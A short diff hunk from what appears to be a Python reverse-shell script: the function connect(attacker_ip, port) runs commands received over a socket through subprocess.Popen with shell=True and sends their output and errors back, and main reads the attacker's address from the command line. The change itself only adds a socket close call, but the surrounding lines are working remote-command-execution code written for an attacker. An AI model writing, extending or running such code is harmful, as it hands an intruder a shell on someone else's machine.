@@ -24,6 +24,7 @@ def connect(attacker_ip, port):
             CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
             s.send( CMD.stdout.read() ) # send back the result
             s.send( CMD.stderr.read() ) # send back the error -if any-, such as syntax error
+            s.close()
 
 def main():
     attacker = sys.argv[1]
